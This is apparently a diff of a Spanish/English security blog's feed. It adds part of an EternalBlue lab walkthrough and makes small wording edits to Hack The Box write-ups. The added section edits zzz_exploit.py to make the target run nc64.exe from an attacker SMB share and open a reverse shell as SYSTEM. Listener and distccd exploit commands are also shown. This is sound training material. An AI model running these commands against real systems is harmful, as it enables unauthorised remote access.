+&lt;p&gt;Aunque las &lt;em&gt;null sessions&lt;/em&gt; están habilitadas, será necesario editar el script para especificar un usuario válido, por ejemplo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt;. No será necesario indicar contraseña. Una vez realizado este ajuste, ejecutaremos nuevamente el script y se nos mostrarán los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;named pipes&lt;/code&gt; disponibles que podremos utilizar durante la explotación.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por defecto, el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zzz_exploit.py&lt;/code&gt; crea un archivo pwned.txt en la máquina víctima, lo cual no nos resulta especialmente útil. Lo que haremos ahora será modificar este script, concretamente la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb_pwn()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;En primer lugar, especificaremos un usuario válido, de forma similar a como hicimos previamente con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checker.py&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A continuación, comentaremos las líneas relacionadas con la creación del archivo y habilitaremos la llamada a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service_exec()&lt;/code&gt;, adaptándola a nuestras necesidades.&lt;/p&gt;
+
+&lt;p&gt;A diferencia de las implementaciones anteriores, en esta ocasión no generaremos ningún &lt;em&gt;shellcode&lt;/em&gt;. En su lugar, levantaremos un recurso compartido en nuestra máquina atacante utilizando el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbserver&lt;/code&gt; de la suite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt;. A través de este recurso compartido expondremos el binario de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt; de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64 bits&lt;/code&gt;, de modo que la máquina víctima pueda ejecutarlo directamente desde nuestro recurso compartido y establecer una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt; hacia nuestro sistema.&lt;/p&gt;
+
+&lt;p&gt;Para conseguir esto, la llamada a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service_exec()&lt;/code&gt; quedará de la siguiente forma:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;service_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;cmd /c \\&amp;lt;IP local&amp;gt;\smbFolder\nc64.exe -e cmd &amp;lt;IP local&amp;gt; 443&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez modificado el script, el siguiente paso será descargar el binario de &lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;Netcat&lt;/a&gt; que vamos a compartir.&lt;/p&gt;
+
+&lt;p&gt;Con el binario ubicado en nuestro directorio de trabajo, desde una nueva terminal crearemos el recurso compartido mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbserver&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-smbserver smbFolder &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finalmente, desde otra terminal nos pondremos en escucha con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con el recurso compartido activo y el listener en ejecución, lanzaremos el exploit indicando uno de los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;named pipes&lt;/code&gt; identificados anteriormente al ejecutar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checker.py&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 zzz_exploit.py &amp;lt;IP del host&amp;gt; samr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De esta forma, obtendremos una shell interactiva dentro de la máquina víctima con privilegios máximos, ejecutándose como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 </description>
         <pubDate>Fri, 20 Feb 2026 00:00:00 -0500</pubDate>
         <link>/es/Blue-Practical-Ethical-Hacking/</link>
@@ -910,7 +1064,7 @@ run
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/54.png&quot; alt=&quot;54&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Entre los resultados, encontramos un exploit que proporciona &lt;em&gt;ejecución remota de comandos&lt;/em&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCE&lt;/code&gt;) mediante un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ataque de deserialización&lt;/code&gt;. Aunque podríamos ejecutarlo directamente, resulta más valioso entender su funcionamiento para practicar el proceso de &lt;em&gt;deserialización&lt;/em&gt; y manipular el exploit manualmente, dándonos así un mayor control y comprensión del ataque.&lt;/p&gt;
+&lt;p&gt;Entre los resultados, encontramos un exploit que proporciona &lt;em&gt;ejecución remota de comandos&lt;/em&gt; (RCE) mediante un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ataque de deserialización&lt;/code&gt;. Aunque podríamos ejecutarlo directamente, resulta más valioso entender su funcionamiento para practicar el proceso de &lt;em&gt;deserialización&lt;/em&gt; y manipular el exploit manualmente, dándonos así un mayor control y comprensión del ataque.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/55.png&quot; alt=&quot;55&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
@@ -1570,7 +1724,7 @@ run
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/54.png&quot; alt=&quot;54&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Among the results, we find an exploit that provides &lt;em&gt;remote code execution&lt;/em&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCE&lt;/code&gt;) via a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deserialization attack&lt;/code&gt;. While we could execute it directly, it is more valuable to understand how it works in order to practice the &lt;em&gt;deserialization&lt;/em&gt; process and manually manipulate the exploit, giving us greater control and understanding of the attack.&lt;/p&gt;
+&lt;p&gt;Among the results, we find an exploit that provides &lt;em&gt;remote code execution&lt;/em&gt; (RCE) via a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;deserialization attack&lt;/code&gt;. While we could execute it directly, it is more valuable to understand how it works in order to practice the &lt;em&gt;deserialization&lt;/em&gt; process and manually manipulate the exploit, giving us greater control and understanding of the attack.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/55.png&quot; alt=&quot;55&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
@@ -2390,7 +2544,7 @@ PASS p@&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;w0rd!
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-09-Lame-Hack-The-Box/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Encontramos una vulnerabilidad que se explota cuando la opción de configuración &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username map script&lt;/code&gt; está activa (no habilitada por defecto). Al especificar un nombre de usuario que contenga &lt;em&gt;metacaracteres de shell&lt;/em&gt;, es posible conseguir ejecución remota de comandos sin necesidad de autenticación previa.&lt;/p&gt;
+&lt;p&gt;Encontramos una vulnerabilidad que se explota cuando la opción de configuración &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username map script&lt;/code&gt; está activa (no habilitada por defecto). Al especificar un nombre de usuario que contenga &lt;em&gt;metacaracteres de shell&lt;/em&gt;, es posible conseguir &lt;em&gt;ejecución remota de comandos&lt;/em&gt; (RCE) sin necesidad de autenticación previa.&lt;/p&gt;
 
 &lt;p&gt;Sin embargo, el exploit que encontramos utiliza &lt;em&gt;Metasploit&lt;/em&gt;, lo cual no se alinea con la metodología que seguimos. No obstante, al examinar el script que encontramos con:&lt;/p&gt;
 
@@ -2440,7 +2594,7 @@ PASS p@&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;w0rd!
 
 &lt;p&gt;Aunque existen scripts que hacen uso de &lt;em&gt;Metasploit&lt;/em&gt; para explotar esta vulnerabilidad, también encontramos un &lt;a href=&quot;https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855#file-distccd_rce_cve-2004-2687-py&quot;&gt;exploit&lt;/a&gt; del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DarkCoderSc&lt;/code&gt; en GitHub que realiza la explotación de forma manual.&lt;/p&gt;
 
-&lt;p&gt;Este exploit nos proporciona ejecución remota de comandos, y podemos probarlo de la siguiente forma:&lt;/p&gt;
+&lt;p&gt;Este exploit nos proporciona &lt;em&gt;ejecución remota de comandos&lt;/em&gt; (RCE), y podemos probarlo de la siguiente forma:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 distccd_rce_CVE-2004-2687.py &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 10.10.10.3 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 3632 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;ifconfig; whoami&apos;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
